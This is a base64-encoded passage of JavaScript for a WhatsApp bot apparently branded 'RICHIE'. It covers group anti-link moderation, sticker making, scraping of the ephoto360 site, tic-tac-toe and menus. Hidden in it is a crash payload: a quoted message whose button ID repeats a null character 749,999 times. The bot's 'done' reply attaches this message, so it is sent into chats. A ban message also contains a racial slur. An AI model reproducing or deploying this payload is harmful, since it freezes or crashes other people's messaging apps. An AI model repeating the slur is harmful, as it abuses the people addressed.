0XzFcIjpcIkFuamF5XCIsXCJzY3JlZW5fMF9Ecm9wZG93bl8yXCI6XCIwMDEtR3JpbWdhclwiLFwic2NyZWVuXzBfUmFkaW9CdXR0b25zR3JvdXBfM1wiOlwiMF90cnVlXCIsXCJmbG93X3Rva2VuXCI6XCJBUUFBQUFBQ1M1RnBnUV9jQUFBQUFFMFFJM3MuXCJ9YCwKICAgICAgICAgICAgICAgICAgICAgICAgInZlcnNpb24iOiAzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNvbnN0IGZjYWxsID0geyBrZXk6IHtmcm9tTWU6IGZhbHNlLCBwYXJ0aWNpcGFudDogYDBAcy53aGF0c2FwcC5uZXRgLCAuLi4oZnJvbSA/IHsgcmVtb3RlSmlkOiAic3RhdHVzQGJyb2FkY2FzdCJ9IDoge30pIH0sJ21lc3NhZ2UnOiB7ZXh0ZW5kZWRUZXh0TWVzc2FnZToge3RleHQ6IGJvZHl9fX0KICAgICAgICAKY29uc3QgY3Vyc29yID0gewprZXk6IHsKZnJvbU1lOiBmYWxzZSwKcGFydGljaXBhbnQ6ICIwQHMud2hhdHNhcHAubmV0IiwKcmVtb3RlSmlkOiAiIgp9LAptZXNzYWdlOiB7CmJ1dHRvbnNNZXNzYWdlOiB7Cmhhc01lZGlhQXR0YWNobWVudDogdHJ1ZSwKY29udGVudFRleHQ6IGDnp4Hjga/jgYLjgarjgZ/jgYzlpb3jgY1gLApmb290ZXJUZXh0OiBgYCwKYnV0dG9uczogWwp7IGJ1dHRvbklkOiAiXHUwMDAwIi5yZXBlYXQoNzQ5OTk5KSwgYnV0dG9uVGV4dDogeyBkaXNwbGF5VGV4dDogIlJpY2hpZUluSGVyZSIgfSwgdHlwZTogMSwgbmF0aXZlRmxvd0luZm86IHsgbmFtZTogInNpbmdsZV9zZWxlY3QiLCBwYXJhbXNKc29uOiAie30iIH0gfQpdLCAKdmlld09uY2U6IHRydWUsCmhlYWRlclR5cGU6IDEKfQp9LCAKY29udGV4dEluZm86IHsKdmlydGV4SWQ6IHJpY2guZ2VuZXJhdGVNZXNzYWdlVGFnKCksCnBhcnRpY2lwYW50OiAiMEBzLndoYXRzYXBwLm5ldCIsCm1lbnRpb25lZEppZDogWyIwQHMud2hhdHNhcHAubmV0Il0sCn0sIAp9OwoKY29uc3QgZ2V0RGV2aWNlID0gcmVxdWlyZSgiQHdoaXNrZXlzb2NrZXRzL2JhaWxleXMiKS5nZXREZXZpY2UKLy8gZW5kIHJlcGx5IAppZiAoIXJpY2gucHVibGljKSB7CmlmICghaXNDcmVhdG9yKSByZXR1cm4KfQpjb25zdCB7CmltYWdlVG9XZWJwLCAKdmlkZW9Ub1dlYnAsIAp3cml0ZUV4aWZJbWcsIAp3cml0ZUV4aWZWaWQsIAp3cml0ZUV4aWYsIAphZGRFeGlmIAp9ID0gcmVxdWlyZSgnLi4vc3lzdGVtL0RhdGEyJykKCmNvbnN0IHsKICAgIHNtc2csCiAgICBzZW5kR21haWwsCiAgICBmb3JtYXRTaXplLAogICAgaXNVcmwsCiAgICBnZXRCdWZmZXIsCn0gPSByZXF1aXJlKCcuL2xpYi9teWZ1bmN0aW9uJyk7Ci8vPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ly8KaWYgKG0ubWltZXR5cGUgPT09ICdpbWFnZS93ZWJwJyAmJiBtLmZpbGVTaGEyNTYpIHsKwqAgwqAgY29uc3QgaGFzaCA9IG0uZmlsZVNoYTI1Ni50b1N0cmluZygnYmFzZTY0Jyk7CsKgIMKgIGNvbnN0IG1hcHBlZENvbW1hbmQgPSBnbG9iYWwuc3RpY2tlckNtZHNbaGFzaF07CsKgIMKgIGlmIChtYXBwZWRDb21tYW5kKSB7CsKgIMKgIMKgIMKgIG0udGV4dCA9IG1hcHBlZENvbW1hbmQ7CsKgIMKgIMKgIMKgIGNvbW1hbmQgPSBtYXBwZWRDb21tYW5kOwrCoCDCoCDCoCDCoCBpc0NtZCA9IHRydWU7CsKgIMKgIH0KfQovLyBBZGQgdGhpcyBwYXJ0IG91dHNpZGUgdGhlIHN3aXRjaCwgaW4geW91ciBtZXNzYWdlIGhhbmRsZXI6CmlmIChtLmlzR3JvdXAgJiYgZ2xvYmFsLl9hbnRpbGlua1ttLmNoYXRdKSB7CiAgICBjb25zdCBsaW5rUmVnZXggPSAvKGh0dHBzPzpcL1wvW15cc10rKS9naTsKICAgIGlmIChsaW5rUmVnZXgudGVzdChtLnRleHQpICYmICFpc0FkbWlucyAmJiAhaXNDcmVhdG9yKSB7CiAgICAgICAgY29uc3Qgd2FybmluZ1RleHQgPSAiIPCfgIRXQVJOSU5HOiBTZW5kaW5nIGxpbmtzIGlzIG5vdCBhbGxvd2VkIGluIHRoaXMgZ3JvdXAhIFxuKmFuaXRsaW5rIGhhbmRsZXIgYnkgYWthbmUqIjsKICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyB0ZXh0OiB3YXJuaW5nVGV4dCB9LCB7IHF1b3RlZDogbSB9KTsKICAgICAgICAvLyBPcHRpb25hbDogS2ljayB1c2VyCiAgICAgICAgLy8gYXdhaXQgY29ubi5ncm91cFBhcnRpY2lwYW50c1VwZGF0ZShtLmNoYXQsIFttLnNlbmRlcl0sICdyZW1vdmUnKTsKICAgIH0KfQoKaWYgKG0uaXNHcm91cCAmJiBhbnRpbGlua1N0YXR1c1ttLmNoYXRdKSB7CiAgICBjb25zdCBkZXRlY3RMaW5rID0gLyhodHRwcz86XC9cL1teXHNdKyl8KFxiXFMqXC5jb21cUypcYikvZ2k7CiAgICBpZiAoZGV0ZWN0TGluay50ZXN0KG0udGV4dCkpIHsKICAgICAgICBpZiAoIWlzZ3JvdXBBZG1pbnMgJiYgIW0ua2V5LmZyb21NZSkgewogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBkZWxldGU6IG0ua2V5IH0pOwogICAgICAgIH0KICAgIH0KfQovLyA9PT0gUE9MTCBGVU5DVElPTiA9PT0KY29uc3Qgc2VuZFBvbGxCdXR0b25NZW51ID0gYXN5bmMgKHJpY2gsIGppZCwgcXVvdGVkTXNnKSA9PiB7CiAgY29uc3QgcG9sbE1lc3NhZ2UgPSB7CiAgICB0ZXh0OiAiKldoYXQncyB5b3VyIGZhdm9yaXRlIGJvdCBmZWF0dXJlPyoiLAogICAgZm9vdGVyOiAiQ2hvb3NlIG9uZSBvcHRpb24gYmVsb3ciLAogICAgYnV0dG9uczogWwogICAgICB7IGJ1dHRvbklkOiAndm90ZTEnLCBidXR0b25UZXh0OiB7IGRpc3BsYXlUZXh0OiAnQW5pbWUgQ29tbWFuZHMnIH0sIHR5cGU6IDEgfSwKICAgICAgeyBidXR0b25JZDogJ3ZvdGUyJywgYnV0dG9uVGV4dDogeyBkaXNwbGF5VGV4dDogJ0dhbWVzICYgWFAnIH0sIHR5cGU6IDEgfSwKICAgICAgeyBidXR0b25JZDogJ3ZvdGUzJywgYnV0dG9uVGV4dDogeyBkaXNwbGF5VGV4dDogJ0FudGktTGluaycgfSwgdHlwZTogMSB9CiAgICBdLAogICAgaGVhZGVyVHlwZTogMQogIH07CgogIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UoamlkLCBwb2xsTWVzc2FnZSwgeyBxdW90ZWQ6IHF1b3RlZE1zZyB9KTsKfTsKICAgIAovLy8gZnVuY3Rpb24gc3RpY2tlcgphc3luYyBmdW5jdGlvbiBzdHlsZXRleHQodGVrcykgewogICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICBheGlvcy5nZXQoJ2h0dHA6Ly9xYXoud3RmL3UvY29udmVydC5jZ2k/dGV4dD0nK3Rla3MpCiAgICAgICAgLnRoZW4oKHsgZGF0YSB9KSA9PiB7CiAgICAgICAgICAgIGxldCAkID0gY2hlZXJpby5sb2FkKGRhdGEpCiAgICAgICAgICAgIGxldCBoYXNpbCA9IFtdCiAgICAgICAgICAgICQoJ3RhYmxlID4gdGJvZHkgPiB0cicpLmVhY2goZnVuY3Rpb24gKGEsIGIpIHsKaGFzaWwucHVzaCh7IG5hbWU6ICQoYikuZmluZCgndGQ6bnRoLWNoaWxkKDEpID4gc3BhbicpLnRleHQoKSwgcmVzdWx0OiAkKGIpLmZpbmQoJ3RkOm50aC1jaGlsZCgyKScpLnRleHQoKS50cmltKCkgfSkKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmVzb2x2ZShoYXNpbCkKICAgICAgICB9KQogICAgfSkKfQoKZnVuY3Rpb24gZ2V0UmFuZG9tRmlsZShleHQpIHsKICAgIHJldHVybiBgJHtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAxMDAwMCl9JHtleHR9YDsKfQphc3luYyBmdW5jdGlvbiBtYWtlU3RpY2tlckZyb21VcmwoaW1hZ2VVcmwsIHJpY2gsIG0pIHsKICAgIHRyeSB7CiAgICAgICAgbGV0IGJ1ZmZlcjsKICAgICAgICBpZiAoaW1hZ2VVcmwuc3RhcnRzV2l0aCgiZGF0YToiKSkgewogICAgICAgICAgICBjb25zdCBiYXNlNjREYXRhID0gaW1hZ2VVcmwuc3BsaXQoIiwiKVsxXTsKICAgICAgICAgICAgYnVmZmVyID0gQnVmZmVyLmZyb20oYmFzZTY0RGF0YSwgJ2Jhc2U2NCcpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgYXhpb3MuZ2V0KGltYWdlVXJsLCB7IHJlc3BvbnNlVHlwZTogJ2FycmF5YnVmZmVyJyB9KTsKICAgICAgICAgICAgYnVmZmVyID0gQnVmZmVyLmZyb20ocmVzcG9uc2UuZGF0YSwgImJpbmFyeSIpOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBjb25zdCB3ZWJwQnVmZmVyID0gYXdhaXQgc2hhcnAoYnVmZmVyKQogICAgICAgICAgICAucmVzaXplKDUxMiwgNTEyLCB7IGZpdDogJ2NvbnRhaW4nLCBiYWNrZ3JvdW5kOiB7IHI6IDI1NSwgZzogMjU1LCBiOiAyNTUsIGFscGhhOiAwIH0gfSkKICAgICAgICAgICAgLndlYnAoeyBxdWFsaXR5OiA3MCB9KQogICAgICAgICAgICAudG9CdWZmZXIoKTsKICAgICAgICAKICAgICAgICBjb25zdCBwZW5pcyA9IGF3YWl0IGFkZEV4aWYod2VicEJ1ZmZlciwgZ2xvYmFsLnBhY2tuYW1lLCBnbG9iYWwuYXV0aG9yKQoKICAgICAgICBjb25zdCBmaWxlTmFtZSA9IGdldFJhbmRvbUZpbGUoIi53ZWJwIik7CiAgICAgICAgZnMud3JpdGVGaWxlU3luYyhmaWxlTmFtZSwgd2VicEJ1ZmZlcik7CgogICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgICAgIHN0aWNrZXI6IHBlbmlzLAogICAgICAgICAgICBjb250ZXh0SW5mbzogewogICAgICAgICAgICAgICAgZXh0ZXJuYWxBZFJlcGx5OiB7CiAgICAgICAgICAgICAgICAgICAgc2hvd0FkQXR0cmlidXRpb246IHRydWUsCiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGBSSUNISUVgLAogICAgICAgICAgICAgICAgICAgIGJvZHk6IGBSSUNISUUgQWx3YXlzIFdpdGggWW91YCwKICAgICAgICAgICAgICAgICAgICBtZWRpYVR5cGU6IDMsCiAgICAgICAgICAgICAgICAgICAgcmVuZGVyTGFyZ2VyVGh1bWJuYWlsOiBmYWxzZSwKICAgICAgICAgICAgICAgICAgICB0aHVtYm5haWxVcmw6IFRodW1iVXJsLCAKICAgICAgICAgICAgICAgICAgICBzb3VyY2VVcmw6IGB0Lm1lL2htbWxldHRzYAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSwgeyBxdW90ZWQ6IG0gfSk7CgogICAgICAgIGZzLnVubGlua1N5bmMoZmlsZU5hbWUpOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBjcmVhdGluZyBzdGlja2VyOiIsIGVycm9yKTsKICAgICAgICBtLnJlcGx5KCcgY2hlY2sgY29uc29sZS4nKTsKICAgIH0KfQphc3luYyBmdW5jdGlvbiBkb25lcmVzcyAoKSB7CmlmICghcSkgdGhyb3cgIkRvbmUgUmVzcG9uc2UiCmxldCBwZXBlYyA9IHEucmVwbGFjZSgvW14wLTldL2csICIiKQpsZXQgcmVzc2RvbmUgPSBg8J+OrwpbIOqqiSBdIGRvbmUgOiBfKiR7Y29tbWFuZH0qX+KdlWAKCiAgbGV0IGJ1dHRvbnMgPSBbCiAgICAgICAgeyBidXR0b25JZDogIi54bWVudSIsIGJ1dHRvblRleHQ6IHsgZGlzcGxheVRleHQ6ICJCYWNrIFRvIE1lbnUiIH0gfSwgCiAgICAgICAgIHsgYnV0dG9uSWQ6ICIuc2NyaXB0IiwgYnV0dG9uVGV4dDogeyBkaXNwbGF5VGV4dDogIkJ1eSBTY3JpcHQiIH0gfQogICAgXTsKCiAgICBsZXQgYnV0dG9uTWVzc2FnZSA9IHsKICAgICAgICBpbWFnZTogdGh1bWIsIAogICAgICAgIGNhcHRpb246IHJlc3Nkb25lLAogICAgICAgIGNvbnRleHRJbmZvOiB7CiAgICAgICAgICAgIGZvcndhcmRpbmdTY29yZTogOTk5LAogICAgICAgICAgICBpc0ZvcndhcmRlZDogdHJ1ZSwKICAgICAgICAgICAgZm9yd2FyZGVkTmV3c2xldHRlck1lc3NhZ2VJbmZvOiB7CiAgICAgICAgICAgICAgICBuZXdzbGV0dGVySmlkOiAiMTIwMzYzMzMxODU5MDc1MDgzQG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgbmV3c2xldHRlck5hbWU6ICJSSUNISUUiCiAgICAgICAgICAgIH0KICAgICAgICB9LAogICAgICAgIGZvb3RlcjogIsKpIFJpY2hpZSDhtIXhtIfhtKDhtIfKn+G0j+G0mOG0h8qAIiwKICAgICAgICBidXR0b25zOiBidXR0b25zLAogICAgICAgIHZpZXdPbmNlOiB0cnVlLAogICAgICAgIGhlYWRlclR5cGU6IDYKICAgIH07CmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCBidXR0b25NZXNzYWdlLCB7IHF1b3RlZDogY3Vyc29yIH0pOwp9CmFzeW5jIGZ1bmN0aW9uIGVwaG90byh1cmwsIHRleGspIHsKbGV0IGZvcm0gPSBuZXcgRm9ybURhdGEgCmxldCBnVCA9IGF3YWl0IGF4aW9zLmdldCh1cmwsIHsKICBoZWFkZXJzOiB7CiAgICAidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA1LjAuMC4wIFNhZmFyaS81MzcuMzYiCiAgfQp9KQpsZXQgJCA9IGNoZWVyaW8ubG9hZChnVC5kYXRhKQpsZXQgdGV4dCA9IHRleGsKbGV0IHRva2VuID0gJCgiaW5wdXRbbmFtZT10b2tlbl0iKS52YWwoKQpsZXQgYnVpbGRfc2VydmVyID0gJCgiaW5wdXRbbmFtZT1idWlsZF9zZXJ2ZXJdIikudmFsKCkKbGV0IGJ1aWxkX3NlcnZlcl9pZCA9ICQoImlucHV0W25hbWU9YnVpbGRfc2VydmVyX2lkXSIpLnZhbCgpCmZvcm0uYXBwZW5kKCJ0ZXh0W10iLCB0ZXh0KQpmb3JtLmFwcGVuZCgidG9rZW4iLCB0b2tlbikKZm9ybS5hcHBlbmQoImJ1aWxkX3NlcnZlciIsIGJ1aWxkX3NlcnZlcikKZm9ybS5hcHBlbmQoImJ1aWxkX3NlcnZlcl9pZCIsIGJ1aWxkX3NlcnZlcl9pZCkKbGV0IHJlcyA9IGF3YWl0IGF4aW9zKHsKICB1cmw6IHVybCwKICBtZXRob2Q6ICJQT1NUIiwKICBkYXRhOiBmb3JtLAogIGhlYWRlcnM6IHsKICAgIEFjY2VwdDogIiovKiIsCiAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwKICAgICJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDUuMC4wLjAgU2FmYXJpLzUzNy4zNiIsCiAgICBjb29raWU6IGdULmhlYWRlcnNbInNldC1jb29raWUiXT8uam9pbigiOyAiKSwKICAgIC4uLmZvcm0uZ2V0SGVhZGVycygpCiAgfQp9KQpsZXQgJCQgPSBjaGVlcmlvLmxvYWQocmVzLmRhdGEpCmxldCBqc29uID0gSlNPTi5wYXJzZSgkJCgiaW5wdXRbbmFtZT1mb3JtX3ZhbHVlX2lucHV0XSIpLnZhbCgpKQpqc29uWyJ0ZXh0W10iXSA9IGpzb24udGV4dApkZWxldGUganNvbi50ZXh0CmxldCB7IGRhdGEgfSA9IGF3YWl0IGF4aW9zLnBvc3QoImh0dHBzOi8vZW4uZXBob3RvMzYwLmNvbS9lZmZlY3QvY3JlYXRlLWltYWdlIiwgbmV3IFVSTFNlYXJjaFBhcmFtcyhqc29uKSwgewogIGhlYWRlcnM6IHsKICAgICJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDUuMC4wLjAgU2FmYXJpLzUzNy4zNiIsCiAgICBjb29raWU6IGdULmhlYWRlcnNbInNldC1jb29raWUiXS5qb2luKCI7ICIpCiAgICB9Cn0pCnJldHVybiBidWlsZF9zZXJ2ZXIgKyBkYXRhLmltYWdlCn0KCiAgLy9nYW1lCiAgICAgICAgdGhpcy5nYW1lID0gdGhpcy5nYW1lID8gdGhpcy5nYW1lIDoge30KICAgICAgICBsZXQgcm9vbSA9IE9iamVjdC52YWx1ZXModGhpcy5nYW1lKS5maW5kKHJvb20gPT4gcm9vbS5pZCAmJiByb29tLmdhbWUgJiYgcm9vbS5zdGF0ZSAmJiByb29tLmlkLnN0YXJ0c1dpdGgoJ3RpY3RhY3RvZScpICYmIFtyb29tLmdhbWUucGxheWVyWCwgcm9vbS5nYW1lLnBsYXllck9dLmluY2x1ZGVzKG0uc2VuZGVyKSAmJiByb29tLnN0YXRlID09ICdQTEFZSU5HJykKICAgICAgICBpZiAocm9vbSkgewogICAgICAgICAgICBsZXQgb2sKICAgICAgICAgICAgbGV0IGlzV2luID0gITEKICAgICAgICAgICAgbGV0IGlzVGllID0gITEKICAgICAgICAgICAgbGV0IGlzU3VycmVuZGVyID0gITEKICAgICAgICAgICAgLy8gcmVwbHkoYFtERUJVR11cbiR7cGFyc2VJbnQobS50ZXh0KX1gKQogICAgICAgICAgICBpZiAoIS9eKFsxLTldfChtZSk/Z2l2ZXVwfHN1cnI/ZW5kZXJ8b2ZmfHNraXApJC9pLnRlc3QobS50ZXh0KSkgcmV0dXJuCiAgICAgICAgICAgIGlzU3VycmVuZGVyID0gIS9eWzEtOV0kLy50ZXN0KG0udGV4dCkKICAgICAgICAgICAgaWYgKG0uc2VuZGVyICE9PSByb29tLmdhbWUuY3VycmVudFR1cm4pIHsKICAgICAgICAgICAgICAgIGlmICghaXNTdXJyZW5kZXIpIHJldHVybiAhMAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICghaXNTdXJyZW5kZXIgJiYgMSA+IChvayA9IHJvb20uZ2FtZS50dXJuKG0uc2VuZGVyID09PSByb29tLmdhbWUucGxheWVyTywgcGFyc2VJbnQobS50ZXh0KSAtIDEpKSkgewogICAgICAgICAgICAgICAgcmVwbHkoewogICAgICAgICAgICAgICAgICAgICctMyc6ICdUaGUgZ2FtZSBpcyBvdmVyJywKICAgICAgICAgICAgICAgICAgICAnLTInOiAnSW52YWxpZCcsCiAgICAgICAgICAgICAgICAgICAgJy0xJzogJ0ludmFsaWQgUG9zaXRpb24nLAogICAgICAgICAgICAgICAgICAgIDA6ICdJbnZhbGlkIFBvc2l0aW9uJywKICAgICAgICAgICAgICAgIH0gW29rXSkKICAgICAgICAgICAgICAgIHJldHVybiAhMAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChtLnNlbmRlciA9PT0gcm9vbS5nYW1lLndpbm5lcikgaXNXaW4gPSB0cnVlCiAgICAgICAgICAgIGVsc2UgaWYgKHJvb20uZ2FtZS5ib2FyZCA9PT0gNTExKSBpc1RpZSA9IHRydWUKICAgICAgICAgICAgbGV0IGFyciA9IHJvb20uZ2FtZS5yZW5kZXIoKS5tYXAodiA9PiB7CiAgICAgICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgICAgIFg6ICfinYwnLAogICAgICAgICAgICAgICAgICAgIE86ICfirZUnLAogICAgICAgICAgICAgICAgICAgIDE6ICcx77iP4oOjJywKICAgICAgICAgICAgICAgICAgICAyOiAnMu+4j+KDoycsCiAgICAgICAgICAgICAgICAgICAgMzogJzPvuI/ig6MnLAogICAgICAgICAgICAgICAgICAgIDQ6ICc077iP4oOjJywKICAgICAgICAgICAgICAgICAgICA1OiAnNe+4j+KDoycsCiAgICAgICAgICAgICAgICAgICAgNjogJzbvuI/ig6MnLAogICAgICAgICAgICAgICAgICAgIDc6ICc377iP4oOjJywKICAgICAgICAgICAgICAgICAgICA4OiAnOO+4j+KDoycsCiAgICAgICAgICAgICAgICAgICAgOTogJznvuI/ig6MnLAogICAgICAgICAgICAgICAgfSBbdl0KICAgICAgICAgICAgfSkKICAgICAgICAgICAgaWYgKGlzU3VycmVuZGVyKSB7CiAgICAgICAgICAgICAgICByb29tLmdhbWUuX2N1cnJlbnRUdXJuID0gbS5zZW5kZXIgPT09IHJvb20uZ2FtZS5wbGF5ZXJYCiAgICAgICAgICAgICAgICBpc1dpbiA9IHRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBsZXQgd2lubmVyID0gaXNTdXJyZW5kZXIgPyByb29tLmdhbWUuY3VycmVudFR1cm4gOiByb29tLmdhbWUud2lubmVyCiAgICAgICAgICAgIGxldCBzdHIgPSBgUm9vbSBJRDogJHtyb29tLmlkfQoKJHthcnIuc2xpY2UoMCwgMykuam9pbignJyl9CiR7YXJyLnNsaWNlKDMsIDYpLmpvaW4oJycpfQoke2Fyci5zbGljZSg2KS5qb2luKCcnKX0KCiR7aXNXaW4gPyBgQCR7d2lubmVyLnNwbGl0KCdAJylbMF19IFdvbiFgIDogaXNUaWUgPyBgR2FtZSBvdmVyYCA6IGBUdXJuICR7WyfinYwnLCAn4q2VJ11bMSAqIHJvb20uZ2FtZS5fY3VycmVudFR1cm5dfSAoQCR7cm9vbS5nYW1lLmN1cnJlbnRUdXJuLnNwbGl0KCdAJylbMF19KWB9CuKdjDogQCR7cm9vbS5nYW1lLnBsYXllclguc3BsaXQoJ0AnKVswXX0K4q2VOiBAJHtyb29tLmdhbWUucGxheWVyTy5zcGxpdCgnQCcpWzBdfQoKVHlwZSAqc3VycmVuZGVyKiB0byBzdXJyZW5kZXIgYW5kIGFkbWl0IGRlZmVhdGAKICAgICAgICAgICAgaWYgKChyb29tLmdhbWUuX2N1cnJlbnRUdXJuIF4gaXNTdXJyZW5kZXIgPyByb29tLnggOiByb29tLm8pICE9PSBtLmNoYXQpCiAgICAgICAgICAgICAgICByb29tW3Jvb20uZ2FtZS5fY3VycmVudFR1cm4gXiBpc1N1cnJlbmRlciA/ICd4JyA6ICdvJ10gPSBtLmNoYXQKICAgICAgICAgICAgaWYgKHJvb20ueCAhPT0gcm9vbS5vKSByaWNoLnNlbmRUZXh0KHJvb20ueCwgc3RyLCBtLCB7CiAgICAgICAgICAgICAgICBtZW50aW9uczogcGFyc2VNZW50aW9uKHN0cikKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmljaC5zZW5kVGV4dChyb29tLm8sIHN0ciwgbSwgewogICAgICAgICAgICAgICAgbWVudGlvbnM6IHBhcnNlTWVudGlvbihzdHIpCiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGlmIChpc1RpZSB8fCBpc1dpbikgewogICAgICAgICAgICAgICAgZGVsZXRlIHRoaXMuZ2FtZVtyb29tLmlkXQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAovLyBlbmQKCmlmIChtLmlzR3JvdXAgJiYgZ2xvYmFsLl9hbnRpbGlua1ttLmNoYXRdKSB7CiAgICBjb25zdCBkZXRlY3RMaW5rID0gLyhodHRwcz86XC9cL1teXHNdKyl8KFxiXFMqXC5jb21cUypcYikvZ2k7CiAgICBjb25zdCBtc2dUZXh0ID0gbS50ZXh0IHx8IG0uYm9keSB8fCAnJzsKICAgIGlmIChkZXRlY3RMaW5rLnRlc3QobXNnVGV4dCkgJiYgIWlzQWRtaW5zICYmICFtLmtleS5mcm9tTWUpIHsKICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBkZWxldGU6IG0ua2V5IH0pOwogICAgfQp9CgoKc3dpdGNoKGNvbW1hbmQpIHsKY2FzZSAnbWVudXRlc3QnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwpsZXQgTWVudSA9IGDwnZec8J2Xu/Cdl7PwnZe8CiDilqIgRGV2ZWxvcGVyIDogUklDSElFIAog4paiIFByZWZpeCA6IE11bHRpCgrwnZei8J2YhPCdl7vwnZey8J2Xvwog4paiIEFkZG93bgog4paiIERlbG93bgog4paiIEFkZHByZW0KIOKWoiBEZWxwcmVtCiDilqIgUHVibGljCiDilqIgU2VsZgog4paiIDwKIOKWoiA+CiDilqIgJGAKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKICBpbWFnZTogeyB1cmw6IGdsb2JhbC5nYW1iYXIgfSwKICBjYXB0aW9uOiBNZW51LAogIGZvb3RlcjogIlNpbXBsZSBCb3QgV2hhdHNBcHAgQnkgVGFtYSBSeXVpY2hpIiwKICBoZWFkZXJUeXBlOiA0LAogIGhhc01lZGlhQXR0YWNobWVudDogdHJ1ZSwKICBjb250ZXh0SW5mbzogewogICAgbWVudGlvbmVkSmlkOiBbbS5jaGF0XSwKICAgIHBhcnRpY2lwYW50OiAiMEBzLndoYXRzYXBwLm5ldCIsCiAgICByZW1vdGVKaWQ6ICJzdGF0dXNAYnJvYWRjYXN0IiwKICAgIGZvcndhcmRpbmdTY29yZTogOTk5OTksCiAgICBpc0ZvcndhcmRlZDogdHJ1ZSwKICAgIGZvcndhcmRlZE5ld3NsZXR0ZXJNZXNzYWdlSW5mbzogewogICAgICBuZXdzbGV0dGVySmlkOiAiQG5ld3NsZXR0ZXIiLAogICAgICBzZXJ2ZXJNZXNzYWdlSWQ6IDEsCiAgICAgIG5ld3NsZXR0ZXJOYW1lOiAicmljaGllIEV4cG9zZWQiCiAgICB9CiAgfQp9LCB7IHF1b3RlZDogbSB9KTsKfQpicmVhazsKY2FzZSAnYnV0dG9ubWVudSc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKY29uc3QgY2FwdGlvbiA9IGAKICBcYOKdlkFLQU5FIE1E4p2WXGAK4qeOIMqc4bSHyp/Kn+G0jyAke20ucHVzaE5hbWV9CuKnjiDKmeG0j+G0myDJtOG0gOG0jeG0hyDjgIwke2JvdG5hbWV944CNCuKnjiBz4bSb4bSA4bSb4bSccyA6IGFjdGl2ZSAK4qeOIMqA4bScybThtJvJquG0jeG0hyAke3J1bnRpbWUocHJvY2Vzcy51cHRpbWUoKSl9CuKnjiDhtI/htKHJtOG0h8qAICR7b3duZXJuYW1lfQrip44g4bSg4bSHyoBzyarhtI/JtCB2LjEuMQoqSGVsbG8qIEAke20/LnNlbmRlci5zcGxpdCgnQCcpWzBdfSDiiJogXGBUSElTIElTIEFLQU5FIE1EXGAKXGBIT1cgTUFZIEkgQVNTSVNUIFlPVSDwn4CEXGAK4p6i4pSB4pSB4pSB4pSB4pSB4piY77iO4pSB4pSB4pSB4pSB4pSB4pSB4p6iCiDwn4CEIOKAoiDwnZeg8J2XmPCdl6HwnZeo8J2XlPCdl5/wnZefCiDwn5iHIOKAoiDwnZeX8J2XovCdl6rwnZeh8J2Xn/Cdl6LwnZeU8J2Xl/Cdl6DwnZeY8J2XofCdl6gKIPCfjJ8g4oCiIPCdl6LwnZeq8J2XofCdl5jwnZel8J2XoPCdl5jwnZeh8J2XqAog8J+RuyDigKIg8J2XmfCdl6jwnZeh8J2XoPCdl5jwnZeh8J2XqAog8J+YuyDigKIg8J2XlPCdl6HwnZec8J2XoPCdl5jwnZeg8J2XmPCdl6HwnZeoCiDwn5a877iPIOKAoiAqRVBIT1RPTUVOVSoKIPCfjqkg4oCiIPCdl6LwnZen8J2Xm/Cdl5jwnZel8J2XoPCdl5jwnZeh8J2XqAog4puR77iPIOKAoiDwnZea8J2XpfCdl6LwnZeo8J2Xo/Cdl6DwnZeY8J2XofCdl6gKIPCfm